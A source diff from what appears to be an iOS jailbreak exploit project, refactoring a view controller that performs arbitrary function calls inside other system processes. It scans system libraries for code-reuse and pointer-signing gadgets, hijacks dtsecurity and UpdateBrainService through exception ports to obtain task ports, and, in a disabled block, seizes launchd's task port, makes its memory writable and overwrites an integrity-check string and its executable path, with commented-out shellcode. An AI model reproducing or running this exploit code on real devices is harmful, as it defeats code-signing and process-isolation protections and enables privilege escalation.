@@ -8,10 +8,11 @@
 @import Darwin;
 @import MachO;
 @import XPC;
-#import <IOKit/IOKitLib.h>
-#import "ViewController.h"
-#include "Header.h"
 #include <sys/wait.h>
+#import <IOKit/IOKitLib.h>
+#import "ProcessContext.h"
+#import "ViewController.h"
+#import "Header.h"
 
 NSDictionary *getLaunchdStringOffsets(void) {
     NSMutableDictionary *dict = [NSMutableDictionary dictionary];
@@ -39,22 +40,22 @@ NSDictionary *getLaunchdStringOffsets(void) {
 }
 
 @interface ViewController ()
-@property(nonatomic) mach_port_t exceptionPort;
 @property(nonatomic) mach_port_t fakeBootstrapPort;
-@property(nonatomic) pid_t childPid, sleepPid;
+@property(nonatomic) ProcessContext *dtProc;
+@property(nonatomic) ProcessContext *ubProc;
 @property(nonatomic) UITextView *logTextView;
 @end
 
 @implementation ViewController
 
 - (void)loadTrustCacheTapped {
+    // Download arm64 XPC service from Apple which we will use to initiate PAC bypass
     char *path = "/var/mobile/.TrustCache";
     int fd = open(path, O_RDONLY);
     struct stat s;
     fstat(fd, &s);
     void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
     assert(map != MAP_FAILED);
-    
     CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
     io_service_t svc = IOServiceGetMatchingService(0, match);
     io_connect_t conn;
@@ -67,7 +68,6 @@ NSDictionary *getLaunchdStringOffsets(void) {
     }
     IOServiceClose(conn);
     IOObjectRelease(svc);
-    
     munmap((void *)map, s.st_size);
     close(fd);
 }
@@ -82,9 +82,9 @@ NSDictionary *getLaunchdStringOffsets(void) {
         [UIAction actionWithTitle:@"Userspace reboot" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
             [self userspaceRebootTapped];
         }],
-//        [UIAction actionWithTitle:@"Load Trust Cache" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
-//            [self loadTrustCacheTapped];
-//        }]
+        [UIAction actionWithTitle:@"Stage1 Prepare" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
+            spawn_stage1_prepare_process();
+        }]
     ]]];
     self.navigationItem.rightBarButtonItems = @[
         [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
@@ -114,9 +114,37 @@ NSDictionary *getLaunchdStringOffsets(void) {
         }
     }
     
-    self.exceptionPort = setup_exception_server();
     self.fakeBootstrapPort = setup_fake_bootstrap_server();
-    self.childPid = -1;
+    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
+    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
+    
+    // TODO: save offsets
+    // unauthenticated br x8 gadget
+    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
+    assert(handle != NULL);
+    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
+    assert(func != NULL);
+    for (; *func != 0xd61f0100; func++) {}
+    brX8Address = (uint64_t)func;
+    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
+    // if br x8 != saved address, clear saved address
+    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
+    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
+        printf("br x8 address changed, clearing saved signed pointer\n");
+        NSUserDefaults.standardUserDefaults.signedPointer = 0;
+        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
+    }
+    
+    // PAC signing gadget
+    func = (uint32_t *)zeroify_scalable_zone;
+    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
+    paciaAddress = (uint64_t)func;
+    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
+    
+    // change LR gadget
+    func = (uint32_t *)dispatch_debug;
+    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
+    changeLRAddress = (uint64_t)func;
 }
 
 - (void)redirectStdio {
@@ -185,25 +213,50 @@ NSDictionary *getLaunchdStringOffsets(void) {
 }
 
 - (void)testButtonTapped {
-    if (getpgid(_childPid) > 0) {
-        printf("Child already spawned with PID %d\n", self.childPid);
-        return;
-    }
-    self.childPid = 0; // TODO: get pid
-    launchTest(@"dtsecurity");
+    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
+    [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
 }
 
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        if (getpgid(self.childPid) <= 0) {
-            launchTest(@"dtsecurity");
+        kern_return_t kr;
+        vm_size_t page_size = getpagesize();
+        
+        dtsecurityTaskPort = self.dtProc.taskPort;
+        if(!dtsecurityTaskPort) {
+            printf("dtsecurity task port is null?\n");
+            return;
         }
         
-        kern_return_t kr;
+        // create a region which holds temp data
+        vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        if (!map) {
+            printf("Failed to call mmap\n");
+            return;
+        }
         
+        // Pass dtsecurity task port to UpdateBrainService
+        RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
+        mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
+        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
+        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
+        vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
+        [self.ubProc writeString:map+0x10 string:"name"];
+        [self.ubProc writeString:map+0x20 string:"port"];
+        RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, map+0x10, map+0x20);
+        RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
+        vm_address_t reply = [self.ubProc read64:map];
+        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, map+0x20);
+        printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
+        
+        
+        
+        
+        
+        
+#if 0
         // Create a region which holds temp data (should we use stack instead?)
-        vm_size_t page_size = getpagesize();
-        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        void *map = RemoteArbCallOld(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         if (!map) {
             printf("Failed to call mmap. Please try resetting pointer and try again\n");
             return;
@@ -212,18 +265,18 @@ NSDictionary *getLaunchdStringOffsets(void) {
         
         // Test mkdir
 //        RemoteWriteString(map, "/tmp/.it_works");
-//        RemoteArbCall(mkdir, map, 0700);
+//        RemoteArbCallOld(mkdir, map, 0700);
         
         // Get my task port
-        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
-//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
+        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCallOld(task_self_trap);
+//        kr = (kern_return_t)RemoteArbCallOld(task_for_pid, dtsecurity_task, getpid(), map);
 //        if (kr != KERN_SUCCESS) {
 //            printf("Failed to get my task port\n");
 //            return;
 //        }
 //        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
         // Map the page we allocated in dtsecurity to this process
-//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
+//        kr = (kern_return_t)RemoteArbCallOld(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
 //        if (kr != KERN_SUCCESS) {
 //            printf("Failed to create dtsecurity<->haxx shared mapping\n");
 //            return;
@@ -234,7 +287,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         
         // Get dtsecurity dyld base for blr x19
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
+         kr = (kern_return_t)RemoteArbCallOld(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
             printf("task_info failed\n");
             return;
@@ -249,7 +302,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
         
         // Get launchd task port
-        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
+        kr = (kern_return_t)RemoteArbCallOld(task_for_pid, dtsecurity_task, 1, map);
         if (kr != KERN_SUCCESS) {
             printf("Failed to get launchd task port\n");
             return;
@@ -260,7 +313,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         
         // Get remote dyld base
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
+        kr = (kern_return_t)RemoteArbCallOld(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
             printf("task_info failed\n");
             return;
@@ -269,7 +322,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
         
         // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
-        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
+        kr = (kern_return_t)RemoteArbCallOld(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
             printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
             return;
@@ -278,7 +331,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         printf("launchd infoArrayCount: %u\n", infoArrayCount);
         
         //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
-        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
+        kr = (kern_return_t)RemoteArbCallOld(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
             printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
             return;
@@ -288,7 +341,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         vm_address_t launchd_base = 0;
         vm_address_t infoArray = RemoteRead64(map);
         for (int i = 0; i < infoArrayCount; i++) {
-            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
+            kr = (kern_return_t)RemoteArbCallOld(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
             uint64_t base = RemoteRead64(map);
             if (base % page_size) {
                 // skip unaligned entries, as they are likely in dsc
@@ -296,7 +349,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
             }
             printf("Image[%d] = 0x%llx\n", i, base);
             // read magic, cputype, cpusubtype, filetype
-            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
+            kr = (kern_return_t)RemoteArbCallOld(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
             uint64_t magic = RemoteRead32(map);
             if (magic != MH_MAGIC_64) {
                 printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
@@ -317,7 +370,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         
         printf("reprotecting 0x%lx\n", launchd_base + 0x5f000);
         RemoteChangeLR(0xFFFFFF00); // fix autibsp
-        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        kr = (kern_return_t)RemoteArbCallOld(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
         if (kr != KERN_SUCCESS) {
             printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
             sleep(5);
@@ -333,7 +386,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         const char *newStr = "AAAA\x00";
         RemoteWriteString(map, newStr);
         RemoteChangeLR(0xFFFFFF00); // fix autibsp
-        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
+        kr = (kern_return_t)RemoteArbCallOld(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
         if (kr != KERN_SUCCESS) {
             printf("vm_write failed\n");
             sleep(5);
@@ -345,7 +398,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         const char *newPath = "/var/.launchd";
         RemoteWriteString(map, newPath);
         RemoteChangeLR(0xFFFFFF00); // fix autibsp
-        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        kr = (kern_return_t)RemoteArbCallOld(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
         if (kr != KERN_SUCCESS) {
             printf("vm_write failed\n");
             sleep(5);
@@ -353,34 +406,34 @@ NSDictionary *getLaunchdStringOffsets(void) {
         }
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
 
-        RemoteArbCall(exit, 0);
-        
+        RemoteArbCallOld(exit, 0);
+#endif
         // stuff
 //        uint64_t remote_list = map + sizeof(uint64_t);
-//        RemoteArbCall(task_threads, launchd_task, remote_list, map);
+//        RemoteArbCallOld(task_threads, launchd_task, remote_list, map);
 //        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
-//        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
+//        RemoteArbCallOld(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
 //        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
 //        for (int i = 0; i < listCnt; i++) {
 //            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
 //            // panic your launchd
-//            RemoteArbCall(thread_abort, act_list[i]);
+//            RemoteArbCallOld(thread_abort, act_list[i]);
 //        }
         
 //        arm_thread_state64_internal ts;
-//        RemoteArbCall(memset, map+0x10, 0x41, sizeof(ts));
-//        kr = RemoteArbCall(thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
+//        RemoteArbCallOld(memset, map+0x10, 0x41, sizeof(ts));
+//        kr = RemoteArbCallOld(thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
 //        printf("thread_create_running returned %d\n", kr);
 //        thread_act_t tid = RemoteRead32(map);
 //        printf("tid: 0x%x\n", tid);
         
 //        printf("Sleeping...\n");
-//        RemoteArbCall(sleep, 10);
+//        RemoteArbCallOld(sleep, 10);
         
         // Get remote dyld base for blr x19
-//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(task_self_trap);
+//        mach_port_t remote_task = (mach_port_t)RemoteArbCallOld(task_self_trap);
 //        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-//        kern_return_t kr = (kern_return_t)RemoteArbCall(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
+//        kern_return_t kr = (kern_return_t)RemoteArbCallOld(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
 //        if (kr != KERN_SUCCESS) {
 //            printf("task_info failed\n");
 //            return;
@@ -396,43 +449,43 @@ NSDictionary *getLaunchdStringOffsets(void) {
 //        blrX19Address = remote_dyld_base + blrX19Offset;
         
         // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
-//        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
+//        RemoteArbCallOld(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
 //        mach_port_t remote_bootstrap_port = RemoteRead32(map);
 //        RemoteWriteString(map, "_os_alloc_once_table");
-//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
-//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
+//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCallOld(dlsym, (uint64_t)RTLD_DEFAULT, map);
+//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCallOld(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
 //        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
-//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
+//        vm_address_t xpc_bootstrap_pipe = RemoteArbCallOld(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
 //        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
 //        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
 //        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
         
-//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
+//        RemoteArbCallOld((void*)dlopen, 0x41414141, 0);
 //        printf("--- MARK: DONE FUNCTION CALL ---\n");
 //        RemoteWriteString(map, "/tmp/.it_works");
-//        RemoteArbCall(mkdir, map, 0700);
+//        RemoteArbCallOld(mkdir, map, 0700);
         
         // submit a launch job to launchd to spawn a root process
         
         //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
         // Can't JIT :(
 //        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
-//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
-//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
+//        RemoteArbCallOld(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
+//        RemoteArbCallOld(ptrace, PT_DETACH, self.sleepPid, 0, 0);
 //        uint32_t shellcode[] = {
 //            0xd2808880, // mov x0, #0x444
 //            0xd65f03c0 // ret
 //        };
 //        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
-//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
+//        RemoteArbCallOld(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
 //        _tmp_ptr = (uint64_t)map;
-//        RemoteArbCall(((uint64_t (*)(void))map));
+//        RemoteArbCallOld(((uint64_t (*)(void))map));
     });
 }
 
 - (void)detachButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        RemoteDetach();
+        RemoteArbCall(self.ubProc, task_self_trap);
     });
 }
 
